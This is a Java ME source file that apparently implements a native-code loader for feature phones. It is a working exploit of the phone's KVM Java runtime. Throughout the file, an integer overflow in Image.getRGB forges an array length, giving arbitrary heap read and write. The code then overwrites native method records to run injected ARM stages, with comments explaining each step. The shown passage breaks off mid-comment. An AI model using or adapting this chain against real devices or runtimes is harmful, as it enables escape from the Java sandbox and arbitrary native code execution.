/* SPDX-License-Identifier: MIT */
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import javax.microedition.lcdui.Image;

/**
 * Concrete owner of the bootstrap methods and native session. Keep this class
 * final: discovery inspects this object's own KVM method table, so moving its
 * native methods into a superclass would break the checked ownership relation.
 * The UI and application configuration stay outside the forged-heap interval.
 */
final class NativeSession {
    /** Optional UI observer. Never invoked while the Java heap view is forged. */
    interface Progress {
        void checkpoint(int code, int percent);
    }

    private static final int FORGED_LENGTH = 0x40000000;
    // Exact adjacency of the five allocations in runChain; indices are words.
    private static final int BOOTSTRAP_PAYLOAD_WORDS = 1024;
    private static final int DESTINATION_TARGET_LENGTH_WORD = 11;
    private static final int VIEW_PAYLOAD_POINTER_WORD = 5;
    private static final int VIEW_SESSION_POINTER_WORD = 6;
    private static final int VIEW_TARGET_POINTER_WORD = 7;
    private static final int VIEW_CANARY_POINTER_WORD = 8;
    private static final int VIEW_CANARY_WORD = 13;
    private static final int CANARY_FIRST = 0x13579BDF;
    private static final int CANARY_SECOND = 0x2468ACE0;
    private int cacheSync;

    final int[] result;
    private final String resource;
    private final Progress progress;
    private int transferTotal, transferred, reportedPercent;
    int error;
    Throwable failure;
    boolean applicationStarted;
    // C3 carrier jump offsets temporarily hold three native literals.
    private static final int CARRIER_BYTES = 114;
    private static final int CARRIER_ENTRY = 12;
    private static final int CARRIER_PAYLOAD = 40;
    private static final int CARRIER_LENGTH = 48;
    private static final int CARRIER_CACHE = 56;
    private static final int[] CARRIER_WORDS = {0xE0194280, 0xE01D4790, 0xE0154798, 0xE0094800,
            0xE0014900, 0xE7ED4A00, 0xE7F51C04, 0xE7EDB510, 0x0000BD10, 0xE7E11C23};
    private int carrierCode, savedPayload, savedLength, savedCache;
    private boolean carrierPatched;
    private byte[] stageBytes;
    private byte[] nativeBytes;
    final FirmwareResolver resolver;
    final FirmwareProfile profile;
    private boolean scanOnly;
    private int launchOptions;
    private byte[] launchArgument;
    // Timing is sampled outside the no-allocation firmware-access interval.
    long discoveryMs;
    private long discoveryStarted;

    /* NativeProtocol names the pinned loader/runtime descriptor. Its transfer
     * area becomes the immutable launch argument after loading has finished. */

    /* Temporary bootstrap objects. No UI objects are allocated while forged. */
    private int[] payload;
    private int[] canary;
    private Object[] pointerBox;
    private int[] target;
    private int[] destination;
    private boolean forged;
    private int viewBase;
    private int cacheMethod;
    private int queryMethod;
    private int cacheFlags;
    private int canaryOriginal;
    private boolean canaryDirty;
    private boolean cachePatched, queryPatched;

    /*
     * Zero arguments: the ROM cache helper does not perform KNI cleanup.
     * Calling that helper through a method with arguments would leave the
     * native operand stack unbalanced, so cacheMarker is deliberately separate.
     */
    private static native void cacheMarker();

    /*
     * One argument: the ARM payload calls KNI_GetParameterAsObject(1, ...).
     * Static native parameters start at index 1; index 0 is reserved for the
     * receiver of an instance native method. loader.S finishes with the
     * firmware's KNI_ReturnVoid routine to discard this argument correctly.
     */
    private static native void nativeQuery(int[] output);

    NativeSession(FirmwareProfile profile, String resource) {
        this(profile, resource, null);
    }

    NativeSession(FirmwareProfile profile, String resource, Progress progress) {
        this.profile = profile;
        this.resource = resource;
        this.progress = progress;
        result = new int[FirmwareApi.DESCRIPTOR + FirmwareApi.COUNT];
        resolver = new FirmwareResolver(profile);
    }

    /** Synchronous call on the launcher's worker thread. No UI during forging. */
    void execute(boolean checkOnly) {
        execute(checkOnly, 0);
    }

    void execute(boolean checkOnly, int options) {
        execute(checkOnly, options, "");
    }

    void execute(boolean checkOnly, int options, String argument) {
        scanOnly = checkOnly;
        launchOptions = options;
        applicationStarted = false;
        int error = 0;
        Throwable thrown = null;
        discoveryStarted = System.currentTimeMillis();
        discoveryMs = -1;
        try {
            // Validate/allocate before any native patching or forged heap view.
            launchArgument = NativeLaunchArgument.encode(argument);
            checkpoint(0x10, -1);
            discoveryStarted = System.currentTimeMillis();
            error = runChain();
            if (error == 0 && !scanOnly) {
                // Restore the forged array BEFORE any streaming or allocation.
                // The loader clears its own method binding on final run/free.
                target[FORGED_LENGTH - 1] = 1;
                forged = false;
                discoveryMs = System.currentTimeMillis() - discoveryStarted;
                checkpoint(0x20, -1);
                loadApplication();
                if (result[NativeProtocol.RESULT_STATUS_WORD] != 0)
                    error = result[NativeProtocol.RESULT_STATUS_WORD];
            }
        } catch (Throwable t) {
            thrown = t;
        } finally {
            try {
                if (queryMethod != 0 && result[NativeProtocol.RESULT_RESIDENT_LOADER_WORD] != 0) {
                    result[NativeProtocol.RESULT_COMMAND_WORD] = NativeProtocol.COMMAND_ABORT;
                    nativeQuery(result);
                    queryMethod = 0;
                }
                restoreKvmState();
            } catch (Throwable t) {
                if (thrown == null)
                    thrown = t;
                error = 90;
            }
            if (discoveryMs < 0)
                discoveryMs = System.currentTimeMillis() - discoveryStarted;
        }
        this.error = error;
        this.failure = thrown;
    }

    private void checkpoint(int code, int percent) {
        // Keep this guard even though all call sites are outside runChain().
        // A future misplaced diagnostic must never invoke allocating UI code
        // with target.length forged. Do not throw/allocate in that case either.
        if (progress != null && !forged)
            progress.checkpoint(code, percent);
    }

    private void reportLoading(int bytes) {
        if (progress == null)
            return;
        transferred += bytes;
        int percent = (int) ((long) transferred * 100 / transferTotal);
        int bucket = percent / 10 * 10;
        if (bucket > reportedPercent) {
            reportedPercent = bucket;
            checkpoint(0x22, bucket);
        }
    }

    private static int resourceWord(InputStream in) throws IOException {
        int a = in.read(), b = in.read(), c = in.read(), d = in.read();
        if ((a | b | c | d) < 0)
            throw new IOException("Truncated native header");
        return a | (b << 8) | (c << 16) | (d << 24);
    }
    private void loaderCall(int op) throws IOException {
        result[NativeProtocol.RESULT_COMMAND_WORD] = op;
        nativeQuery(result);
        if (result[NativeProtocol.RESULT_MAGIC_WORD] != NativeProtocol.RESULT_MAGIC
                || result[NativeProtocol.RESULT_STATUS_WORD] != 0)
            throw new IOException("Loader check " + result[NativeProtocol.RESULT_STATUS_WORD]);
    }
    private void transfer(InputStream in, byte[] buf, int offset, int size) throws IOException {
        while (size > 0) {
            int n = size > buf.length ? buf.length : size;
            int pos = 0;
            while (pos < n) {
                int r = in.read(buf, pos, n - pos);
                if (r < 0)
                    throw new IOException("Truncated native image");
                if (r == 0) {
                    int c = in.read();
                    if (c < 0)
                        throw new IOException("Native EOF");
                    buf[pos++] = (byte) c;
                } else
                    pos += r;
            }
            for (int i = n; i < ((n + 3) & ~3); i++)
                buf[i] = 0;
            for (int i = 0; i < n; i += 4)
                result[NativeProtocol.RESULT_TRANSFER_WORD + (i >> 2)] = readWordLE(buf, i);
            result[NativeProtocol.RESULT_TRANSFER_OFFSET_WORD] = offset;
            result[NativeProtocol.RESULT_TRANSFER_BYTES_WORD] = n;
            loaderCall(NativeProtocol.COMMAND_TRANSFER);
            reportLoading(n);
            offset += n;
            size -= n;
        }
    }
    private void loadApplication() throws IOException {
        InputStream in = resource.endsWith(".parts")
                ? new ChunkedResourceInputStream(NativeSession.class, resource)
                : NativeSession.class.getResourceAsStream(resource);
        if (in == null)
            throw new IOException("Missing native application");
        int memory, entry, relocations, stack, bindings;
        try {
            if (resourceWord(in) != NativeProtocol.IMAGE_MAGIC
                    || resourceWord(in) != NativeProtocol.IMAGE_VERSION)
                throw new IOException("Bad native image version");
            int bytes = resourceWord(in);
            memory = resourceWord(in);
            entry = resourceWord(in);
            relocations = resourceWord(in);
            stack = resourceWord(in);
            bindings = resourceWord(in);
            int allocation = NativeImageBounds.allocationBytes(
                    bytes, memory, entry, relocations, stack, bindings);
            if (allocation == 0)
                throw new IOException("Bad native image bounds");
            byte[] buf = new byte[NativeProtocol.TRANSFER_BYTES];
            result[NativeProtocol.RESULT_ALLOCATION_BYTES_WORD] = allocation;
            checkpoint(0x21, -1);
            loaderCall(NativeProtocol.COMMAND_ALLOCATE);
            transferTotal = bytes + NativeProtocol.RELOCATION_BYTES * relocations
                    + NativeProtocol.BINDING_BYTES * bindings;
            transferred = 0;
            reportedPercent = 0;
            checkpoint(0x22, 0);
            transfer(in, buf, 0, bytes);
            transfer(in, buf, memory, NativeProtocol.RELOCATION_BYTES * relocations);
            transfer(in, buf, memory + NativeProtocol.RELOCATION_BYTES * relocations,
                    NativeProtocol.BINDING_BYTES * bindings);
            if (in.read() != -1)
                throw new IOException("Trailing native image bytes");
        } finally {
            in.close();
        }
        result[NativeProtocol.RESULT_IMAGE_BYTES_WORD] = memory;
        result[NativeProtocol.RESULT_RELOCATION_COUNT_WORD] = relocations;
        result[NativeProtocol.RESULT_ENTRY_OFFSET_WORD] = entry;
        result[NativeProtocol.RESULT_BINDING_COUNT_WORD] = bindings;
        result[FirmwareApi.LAUNCH_OPTIONS_WORD] = launchOptions;
        NativeLaunchArgument.write(result, launchArgument);
        result[NativeProtocol.RESULT_COMMAND_WORD] = NativeProtocol.COMMAND_RUN;
        checkpoint(0x23, -1);
        // Native entry restores this method slot before running the application.
        // After it returns there is no callable native binding left.
        queryMethod = 0;
        queryPatched = false;
        applicationStarted = true;
        nativeQuery(result);
    }

    /**
     * Returns a numeric error instead of allocating exception objects after
     * target.length has been forged. All text is formatted after restoration.
     */
    private int runChain() throws IOException {
        if (stageBytes == null) {
            /* Resource I/O allocates buffers, so it belongs before System.gc()
             * and well before the five-array layout used by the bootstrap. */
            stageBytes = readResource("/stage.bin");
            nativeBytes = readResource("/native.bin");
        }
        if (stageBytes == null || nativeBytes == null) {
            return 1;
        }
        if ((stageBytes.length & 3) != 0 || stageBytes.length > NativeProtocol.STAGE_MAX_BYTES
                || (nativeBytes.length & 3) != 0 || nativeBytes.length == 0
                || nativeBytes.length > NativeProtocol.LOADER_MAX_BYTES) {
            return 2;
        }

        result[NativeProtocol.RESULT_MAGIC_WORD] = 0;
        result[NativeProtocol.RESULT_COMMAND_WORD] = 0;
        result[NativeProtocol.RESULT_IMAGE_WORD] = 0;
        for (int i = 3; i < result.length; i++) {
            result[i] = 0;
        }
        // Materialize/check the carrier method while Java allocation is safe.
        if (carrierSwitch(0) != 1)
            return 120;
        int[] rgb = {FORGED_LENGTH};
        Image source = Image.createRGBImage(rgb, 1, 1, true);
        int[] measured = new int[1];
        source.getRGB(measured, 0, 1, 0, 0, 1, 1);
        /* The eventual corrupting write is a pixel copy, not a raw integer
         * store. Measure the device's ARGB conversion first: if this value is
         * not preserved exactly, it cannot safely become the forged length. */
        if (measured[0] != FORGED_LENGTH) {
            return 3;
        }

        /* Release the previous invocation's complete object group before GC. */
        payload = null;
        canary = null;
        pointerBox = null;
        target = null;
        destination = null;
        cacheMethod = 0;
        queryMethod = 0;
        cachePatched = queryPatched = carrierPatched = false;
        carrierCode = 0;
        canaryDirty = false;
        forged = false;
        System.gc();

        /*
         * Exact KVM high-end allocation order. There must be no object
         * allocation between these five statements.
         *
         *   destination[11]       = target.length
         *   target[5..8]          = pointerBox[0..3]
         *   target[13..14]        = canary[0..1]
         */
        payload = new int[BOOTSTRAP_PAYLOAD_WORDS];
        canary = new int[2];
        pointerBox = new Object[4];
        target = new int[1];
        destination = new int[8];
        canary[0] = CANARY_FIRST;
        canary[1] = CANARY_SECOND;
        pointerBox[0] = payload;
        pointerBox[1] = this;
        pointerBox[2] = target;
        pointerBox[3] = canary;

        if (target.length != 1) {
            return 4;
        }
        overflowedOnePixelWrite(source, destination, DESTINATION_TARGET_LENGTH_WORD);
        if (target.length != FORGED_LENGTH) {
            return 5;
        }
        forged = true;
        /* From this point until restoreKvmState, target is an address-translation
         * window, not an ordinary one-element array. readWord/writeWord use
         * 32-bit index scaling to reach any aligned KVM address. */
        if (target[VIEW_CANARY_WORD] != CANARY_FIRST
                || target[VIEW_CANARY_WORD + 1] != CANARY_SECOND || canary[0] != CANARY_FIRST
                || canary[1] != CANARY_SECOND) {
            return 6;
        }

        /* Prove reversible cross-object access before touching method metadata. */
        canaryOriginal = canary[0];
        canaryDirty = true;
        target[VIEW_CANARY_WORD] = canaryOriginal + 1;
        if (canary[0] != canaryOriginal + 1) {
            return 7;
        }
        target[VIEW_CANARY_WORD] = canaryOriginal;
        canaryDirty = false;
        if (canary[0] != canaryOriginal) {
            return 8;
        }

        int payloadObject = target[VIEW_PAYLOAD_POINTER_WORD];
        int sessionObject = target[VIEW_SESSION_POINTER_WORD];
        int targetObject = target[VIEW_TARGET_POINTER_WORD];
        int canaryObject = target[VIEW_CANARY_POINTER_WORD];
        if (payloadObject == 0 || sessionObject == 0 || targetObject == 0 || canaryObject == 0
                || ((payloadObject | sessionObject | targetObject | canaryObject) & 3) != 0) {
            return 9;
        }
        if (!ramRange(payloadObject,
                    KvmLayout.ARRAY_DATA + NativeProtocol.WORD_BYTES * payload.length)
                || !ramRange(sessionObject, NativeProtocol.WORD_BYTES)
                || !ramRange(targetObject, KvmLayout.ARRAY_DATA + NativeProtocol.WORD_BYTES)
                || !ramRange(canaryObject, KvmLayout.ARRAY_DATA + 2 * NativeProtocol.WORD_BYTES))
            return 9;
        viewBase = targetObject + KvmLayout.ARRAY_DATA;

        // This scanner allocates nothing and calls no native service. All
        // firmware bindings are discovered while the arbitrary read view exists.
        if (!resolver.resolve(target, viewBase))
            return resolver.error;
        cacheSync = resolver.api[FirmwareApi.CACHE_SYNC];
        // Native configuration occupies reserved descriptor words before the
        // transfer buffer (96). The same ARM payload serves both displays.
        result[FirmwareApi.UI_REFRESH_WORD] = resolver.uiRefresh;
        result[FirmwareApi.DISPLAY_WIDTH_WORD] = profile.displayWidth;
        result[FirmwareApi.DISPLAY_HEIGHT_WORD] = profile.displayHeight;
        result[FirmwareApi.TIMER_MESSAGE_LAST_WORD] = profile.timerMessageLast;
        result[FirmwareApi.IGNORED_TIMER_WORD] = profile.ignoredTimer;
        result[FirmwareApi.SPECIAL_TIMER_WORD] = profile.specialTimer;
        result[FirmwareApi.SPECIAL_TIMER_HANDLER_WORD] = resolver.specialTimerHandler;
        result[FirmwareApi.INPUT_LAYOUT_WORD] = profile.inputLayout;
        result[FirmwareApi.CANVAS_LAYOUT_WORD] = profile.canvasLayout;
        for (int i = 0; i < FirmwareApi.COUNT; i++)
            result[FirmwareApi.DESCRIPTOR + i] = resolver.api[i];

        /*
         * Recover metadata from live pointers rather than hardcoded heap
         * addresses. On this KVM an instance's class pointer is at object+0,
         * the writable method-table pointer is at class+36, the table starts
         * with a count, and each following method record is 32 bytes.
         */
        int classObject = readWord(sessionObject);
        if (!ramRange(classObject, KvmLayout.CLASS_BYTES)) {
            return 10;
        }
        int methodTable = readWord(classObject + KvmLayout.CLASS_METHOD_TABLE);
        if (!ramRange(methodTable, KvmLayout.METHOD_TABLE_HEADER)) {
            return 10;
        }
        int methodCount = readWord(methodTable);
        if (methodCount < 1 || methodCount > KvmLayout.METHOD_MAX_COUNT
                || !ramRange(methodTable,
                        KvmLayout.METHOD_TABLE_HEADER + KvmLayout.METHOD_BYTES * methodCount)) {
            return 10;
        }
        cacheMethod = findNativeMethod(methodTable, methodCount, classObject, 0);
        queryMethod = findNativeMethod(methodTable, methodCount, classObject, 1);
        if (cacheMethod == 0 || queryMethod == 0 || cacheMethod == queryMethod) {
            return 11;
        }
        cacheFlags = readWord(cacheMethod + KvmLayout.METHOD_FLAGS);
        int queryFlags = readWord(queryMethod + KvmLayout.METHOD_FLAGS);
        /* Preserve the raw record words before changing anything. These values
         * distinguish a flag-layout assumption from an already-bound code slot. */
        result[NativeProtocol.BOOTSTRAP_CACHE_FLAGS_WORD] = cacheFlags;
        result[NativeProtocol.BOOTSTRAP_QUERY_FLAGS_WORD] = queryFlags;
        result[NativeProtocol.BOOTSTRAP_CACHE_CODE_WORD] =
                readWord(cacheMethod + KvmLayout.METHOD_CODE);
        result[NativeProtocol.BOOTSTRAP_QUERY_CODE_WORD] =
                readWord(queryMethod + KvmLayout.METHOD_CODE);
        result[NativeProtocol.BOOTSTRAP_CACHE_SIGNATURE_WORD] =
                readWord(cacheMethod + KvmLayout.METHOD_SIGNATURE);
        result[NativeProtocol.BOOTSTRAP_QUERY_SIGNATURE_WORD] =
                readWord(queryMethod + KvmLayout.METHOD_SIGNATURE);
        result[NativeProtocol.BOOTSTRAP_CACHE_METHOD_INDEX_WORD] =
                (cacheMethod - methodTable - KvmLayout.METHOD_TABLE_HEADER)
                / KvmLayout.METHOD_BYTES;
        result[NativeProtocol.BOOTSTRAP_QUERY_METHOD_INDEX_WORD] =
                (queryMethod - methodTable - KvmLayout.METHOD_TABLE_HEADER)
                / KvmLayout.METHOD_BYTES;
        result[NativeProtocol.BOOTSTRAP_METHOD_COUNT_WORD] = methodCount;
        /* KVM adds ACC_POINTER|ACC_DOUBLE (0xC000) to void methods as internal
         * return-type metadata. Thus both private static native void records
         * have runtime flags 0xC10A, not just the class-file bits 0x10A. Keep
         * the original full words for restoration, including these extra bits. */
        if ((cacheFlags & 0xFFFF) != KvmLayout.FLAGS_PRIVATE_STATIC_NATIVE_VOID
                || (queryFlags & 0xFFFF) != KvmLayout.FLAGS_PRIVATE_STATIC_NATIVE_VOID
                || result[NativeProtocol.BOOTSTRAP_CACHE_CODE_WORD] != 0
                || result[NativeProtocol.BOOTSTRAP_QUERY_CODE_WORD] != 0) {
            return 12;
        }

        if (FirmwareProfiles.CARRIER_BOOTSTRAP.equals(profile.bootstrapId))
            return installThroughCarrier(
                    methodTable, methodCount, classObject, payloadObject + KvmLayout.ARRAY_DATA);

        /* Select an address that is also safe when read as KVM method flags. */
        int payloadData = payloadObject + KvmLayout.ARRAY_DATA;
        int stageIndex = findStageIndex(
                payloadData, payload.length, cacheMethod, stageBytes.length, nativeBytes.length);
        if (stageIndex < 0) {
            return 13;
        }
        int stageAddress = payloadData + (stageIndex << 2);
        int nativeIndex = stageIndex + NativeProtocol.STAGE_LOADER_GAP_WORDS;
        if ((nativeIndex << 2) + nativeBytes.length > (payload.length << 2)) {
            return 14;
        }
        int nativeAddress = payloadData + (nativeIndex << 2);
        if (!copyAndBindLoader(nativeBytes, payload, nativeIndex))
            return 119;
        /* stage.bin is position independent except for three literal slots.
         * Patch those slots with this invocation's live payload address, exact
         * byte length, and firmware cache helper before synchronizing it. */
        if (!copyAndPatchStage(
                    stageBytes, payload, stageIndex, nativeAddress, nativeBytes.length)) {
            return 15;
        }
        if (scanOnly)
            return 0;

        /*
         * At the native BLX, r0=accessFlags and r1=methodRecord. Supplying the
         * stage address as flags gives the cache helper r0=A and a wrapped end
         * A+methodRecord. Its first two 32-byte lines cover this entire stage.
         * cacheMarker has no Java arguments, so direct ROM return needs no KNI
         * argument cleanup.
         */
        cachePatched = true;
        writeWord(cacheMethod + KvmLayout.METHOD_FLAGS, stageAddress);
        writeWord(cacheMethod + KvmLayout.METHOD_CODE, cacheSync);
        cacheMarker();
        writeWord(cacheMethod + KvmLayout.METHOD_CODE, 0);
        writeWord(cacheMethod + KvmLayout.METHOD_FLAGS, cacheFlags);
        cachePatched = false;
        cacheMethod = 0;

        /* The stage now synchronizes the full ARM payload and enters it.
         * stageAddress is intentionally even: BLX would interpret bit zero set
         * as a Thumb entry. The native method's own access flags stay intact,
         * so nativeQuery still receives result[] through the normal KNI frame. */
        queryPatched = true;
        writeWord(queryMethod + KvmLayout.METHOD_CODE, stageAddress);
        result[NativeProtocol.RESULT_METHOD_SLOT_WORD] = queryMethod + KvmLayout.METHOD_CODE;
        result[NativeProtocol.RESULT_LOADER_SOURCE_WORD] = nativeAddress;
        result[NativeProtocol.RESULT_LOADER_BYTES_WORD] = nativeBytes.length;
        nativeQuery(result);
        // Keep the loader bound while loadApplication streams the image.
        if (result[NativeProtocol.RESULT_MAGIC_WORD] != NativeProtocol.RESULT_MAGIC) {
            return 16;
        }
        if (result[NativeProtocol.RESULT_STATUS_WORD] != 0
                || result[NativeProtocol.RESULT_RESIDENT_LOADER_WORD] == 0)
            return 18;
        return 0;
    }

    /** Use KVM-synchronized bytecode as a small Thumb cache trampoline. */
    private int installThroughCarrier(int table, int count, int owner, int payloadData) {
        int method = findCarrierMethod(table, count, owner);
        if (method == 0)
            return 120;
        carrierCode = readWord(method + KvmLayout.METHOD_CODE);
        if (!copyAndBindLoader(nativeBytes, payload, 0))
            return 119;
        if (scanOnly)
            return 0;
        savedPayload = readWord(carrierCode + CARRIER_PAYLOAD);
        savedLength = readWord(carrierCode + CARRIER_LENGTH);
        savedCache = readWord(carrierCode + CARRIER_CACHE);
        carrierPatched = true;
        writeWord(carrierCode + CARRIER_PAYLOAD, payloadData);
        writeWord(carrierCode + CARRIER_LENGTH, nativeBytes.length);
        writeWord(carrierCode + CARRIER_CACHE, cacheSync);
        if (readWord(carrierCode + CARRIER_PAYLOAD) != payloadData
                || readWord(carrierCode + CARRIER_LENGTH) != nativeBytes.length
                || readWord(carrierCode + CARRIER_CACHE) != cacheSync)
            return 121;
        queryPatched = true;
        writeWord(queryMethod + KvmLayout.METHOD_CODE, (carrierCode + CARRIER_ENTRY) | 1);
        result[NativeProtocol.RESULT_METHOD_SLOT_WORD] = queryMethod + KvmLayout.METHOD_CODE;
        result[NativeProtocol.RESULT_LOADER_SOURCE_WORD] = payloadData;
        result[NativeProtocol.RESULT_LOADER_BYTES_WORD] = nativeBytes.length;
        nativeQuery(result);
        // The loader has replaced the temporary carrier binding with its own
        // OS-heap copy. Restore all Java jump offsets before any allocation.
        restoreCarrier();
        if (result[NativeProtocol.RESULT_MAGIC_WORD] != NativeProtocol.RESULT_MAGIC)
            return 16;
        if (result[NativeProtocol.RESULT_STATUS_WORD] != 0
                || result[NativeProtocol.RESULT_RESIDENT_LOADER_WORD] == 0)
            return 18;
        return 0;
    }

    private void restoreCarrier() {
        if (!carrierPatched)
            return;
        writeWord(carrierCode + CARRIER_PAYLOAD, savedPayload);
        writeWord(carrierCode + CARRIER_LENGTH, savedLength);
        writeWord(carrierCode + CARRIER_CACHE, savedCache);
        carrierPatched = false;
    }

    private int findCarrierMethod(int table, int count, int owner) {
        int found = 0;
        for (int i = 0; i < count; i++) {
            int method = table + KvmLayout.METHOD_TABLE_HEADER + i * KvmLayout.METHOD_BYTES;
            int code = readWord(method + KvmLayout.METHOD_CODE);
            if (readWord(method + KvmLayout.METHOD_OWNER) == owner
                    && (readWord(method + KvmLayout.METHOD_SIGNATURE)
                               >>> KvmLayout.METHOD_ARGUMENT_SHIFT)
                            == 1
                    && (readWord(method + KvmLayout.METHOD_FLAGS) & KvmLayout.FLAGS_NATIVE_STATIC)
                            == KvmLayout.FLAGS_STATIC
                    && (readWord(method + KvmLayout.METHOD_CODE_LENGTH) & 65535) == CARRIER_BYTES
                    && ramRange(code, CARRIER_BYTES + 2) && verifyCarrier(code)) {
                if (found != 0)
                    return 0;
                found = method;
            }
        }
        return found;
    }

    private boolean verifyCarrier(int code) {
        // iload_0; lookupswitch, default=111, npairs=10 (JVM big-endian).
        if (readWord(code) != 0x0000AB1A || readWord(code + 4) != 0x6F000000
                || readWord(code + 8) != 0x0A000000)
            return false;
        for (int i = 0; i < CARRIER_WORDS.length; i++) {
            if (readWord(code + 12 + i * 8) != CARRIER_WORDS[i]
                    || readWord(code + 16 + i * 8) != ((91 + i * 2) << 24))
                return false;
        }
        // KVM quickens executed ireturn bytes to D5/D6 (monitor/plain).
        // carrierSwitch(0) above executes the default return before discovery.
        // Keep validating every byte, accepting only those known return forms.
        for (int i = 92; i < 114; i += 2) {
            int pair = (readWord((code + i) & ~3) >>> (((code + i) & 2) * 8)) & 65535;
            int opcode = pair >>> 8;
            if ((pair & 255) != (i == 112 ? 4 : 3)
                    || (opcode != 0xAC && opcode != 0xD5 && opcode != 0xD6))
                return false;
        }
        return true;
    }

    /**
     * Hand-maintained Java, compiled and preverified normally. Each case match
     * encodes a Thumb instruction plus branch. Native execution skips the JVM
     * branch-offset words, using three of them as temporary literal data.
     * The verifier checks the complete compiled body and executes the Thumb
     * path in Unicorn; the handset checks the body again before patching it.
     */
    private static int carrierSwitch(int value) {
        switch (value) {
            case -2143151648:
                return 0;
            case -1874387488:
                return 0;
            case -1740171808:
                return 0;
            case 4721120:
                return 0;
            case 4784608:
                return 0;
            case 4910567:
                return 0;
            case 69006823:
                return 0;
            case 280358375:
                return 0;
            case 280821760:
                return 0;
            case 589095399:
                return 0;
            default:
                return 1;
        }
    }

    /**
     * Undo in dependency order while the forged view is still available:
     * native code pointers/flags first, canary second, array length last.
     * Setting target.length to one removes the ability to repair anything else,
     * so no later statement may depend on out-of-bounds target accesses.
     */
    private void restoreKvmState() {
        if (!forged) {
            return;
        }
        if (cachePatched && cacheMethod != 0) {
            writeWord(cacheMethod + KvmLayout.METHOD_CODE, 0);
            writeWord(cacheMethod + KvmLayout.METHOD_FLAGS, cacheFlags);
            cacheMethod = 0;
            cachePatched = false;
        }
        if (queryPatched && queryMethod != 0) {
            writeWord(queryMethod + KvmLayout.METHOD_CODE, 0);
            queryMethod = 0;
            queryPatched = false;
        }
        restoreCarrier();
        if (canaryDirty) {
            target[VIEW_CANARY_WORD] = canaryOriginal;
            canaryDirty = false;
        }
        /* index scaling wraps to target+8, the original length field */
        target[FORGED_LENGTH - 1] = 1;
        forged = false;
    }

    /**
     * Locates an unresolved native method by structural properties, not by its
     * position in the compiler-generated method table. The relevant record
     * fields are code+4, accessFlags+20, owner+24, and argumentCount+30.
     * Since +30 is the upper half of the word at +28, the argument count is
     * extracted with an unsigned 16-bit shift. Ambiguity returns zero: choosing
     * an arbitrary matching record could redirect an unrelated native method.
     */
    private int findNativeMethod(int table, int count, int owner, int wantedArgs) {
        int found = 0;
        for (int i = 0; i < count; i++) {
            int method = table + KvmLayout.METHOD_TABLE_HEADER + i * KvmLayout.METHOD_BYTES;
            int flags = readWord(method + KvmLayout.METHOD_FLAGS);
            int args = readWord(method + KvmLayout.METHOD_SIGNATURE)
                    >>> KvmLayout.METHOD_ARGUMENT_SHIFT;
            if (readWord(method + KvmLayout.METHOD_OWNER) == owner
                    && readWord(method + KvmLayout.METHOD_CODE) == 0
                    && (flags & KvmLayout.FLAGS_NATIVE_STATIC) == KvmLayout.FLAGS_NATIVE_STATIC
                    && args == wantedArgs) {
                if (found != 0) {
                    return 0; // ambiguous: do not guess
                }
                found = method;
            }
        }
        return found;
    }

    /*
     * target[0] is at viewBase=targetObject+12. KVM computes an element address
     * as viewBase+(index<<2) modulo 2^32. Subtracting viewBase and shifting
     * right unsigned therefore maps every aligned 32-bit address to a positive
     * index in 0..0x3fffffff, all accepted by the forged length 0x40000000.
     * This also handles addresses numerically below targetObject via wraparound.
     */
    private int readWord(int address) {
        int index = (address - viewBase) >>> 2;
        return target[index];
    }

    private boolean ramRange(int address, int bytes) {
        return profile.ramRange(address, bytes);
    }

    private void writeWord(int address, int value) {
        int index = (address - viewBase) >>> 2;
        target[index] = value;
    }

    /* Java has no unsigned int comparison. Flipping the sign bit maps unsigned
     * order onto signed order without using long or allocating boxed values. */
    private static boolean unsignedLess(int a, int b) {
        return (a ^ 0x80000000) < (b ^ 0x80000000);
    }

    /**
     * The stage address doubles as cacheMarker's accessFlags. Require
     * ACC_NATIVE|ACC_STATIC, but reject ACC_ABSTRACT (0x400): RM-443's first
     * invokestatic path tests it at F0DDA8CC BEFORE its native dispatch at
     * F0DDA940. Ignoring that bit causes AbstractMethodError: cacheMarker for
     * some heap layouts, even with a valid code pointer. Do not just mask the
     * flags after choosing an address: r0 must still point at the actual stage.
     *
     * The cache helper needs a wrapped end (A+methodRecord < A unsigned).
     * Its two 32-byte cache lines must cover the whole stage. Reserve 64 bytes
     * before the loader, and ensure both fit in the payload array. This helper
     * must remain allocation-free while target.length is forged.
     */
    private static int findStageIndex(int payloadData, int payloadWords, int methodAddress,
            int stageLength, int nativeLength) {
        for (int i = 0; ((i + NativeProtocol.STAGE_LOADER_GAP_WORDS) << 2) + nativeLength
                <= (payloadWords << 2);
                i++) {
            int address = payloadData + (i << 2);
            if ((address & KvmLayout.FLAGS_NATIVE_STATIC) == KvmLayout.FLAGS_NATIVE_STATIC
                    && (address & KvmLayout.FLAGS_ABSTRACT) == 0
                    && unsignedLess(address + methodAddress, address)
                    && stageLength <= 2 * KvmLayout.CACHE_LINE_BYTES
                                    - (address & (KvmLayout.CACHE_LINE_BYTES - 1)))
                return i;
        }
        return -1;
    }

    /**
     * Turns the public one-pixel copy into destination[d].
     *
     * <p>Java's signed additions overflow: x+width and offset+width become
     * negative and pass the upper-bound checks. The native wrapper narrows x,
     * width, and scanlength to 0, 1, and 1, but retains the 32-bit offset in
     * object+12+(offset<<2). Since (0x40000000+d)<<2 wraps to d*4, the native
     * destination is exactly destination[d].</p>
     */
    private static void overflowedOnePixelWrite(Image image, int[] output, int d) {
        image.getRGB(output, FORGED_LENGTH + d, FORGED_LENGTH + 1, FORGED_LENGTH, 0,
                FORGED_LENGTH + 1, 1);
    }

    /* ARM instructions and literals are embedded little-endian. The final byte
     * is signed deliberately: shifting it by 24 preserves bit 31, while the
     * lower three bytes are masked to avoid unwanted sign extension. */
    private static int readWordLE(byte[] bytes, int offset) {
        return (bytes[offset] & 255) | ((bytes[offset + 1] & 255) << 8)
                | ((bytes[offset + 2] & 255) << 16) | (bytes[offset + 3] << 24);
    }

    private boolean copyAndBindLoader(byte[] bytes, int[] words, int wordIndex) {
        int patched = 0;
        for (int i = 0; i < bytes.length; i += 4) {
            int word = readWordLE(bytes, i);
            if ((word & NativeProtocol.LOADER_PATCH_MASK) == NativeProtocol.LOADER_PATCH_MAGIC) {
                int id = word & 65535;
                if (id >= FirmwareApi.COUNT || resolver.api[id] == 0)
                    return false;
                word = resolver.api[id];
                ++patched;
            }
            words[wordIndex + (i >> 2)] = word;
        }
        return patched == NativeProtocol.LOADER_API_COUNT;
    }

    /**
     * Copies and relocates the tiny first stage without allocating another
     * array. Each placeholder sets a different bit; all three must be seen.
     * verify.py independently requires exactly one of each in stage.bin, so a
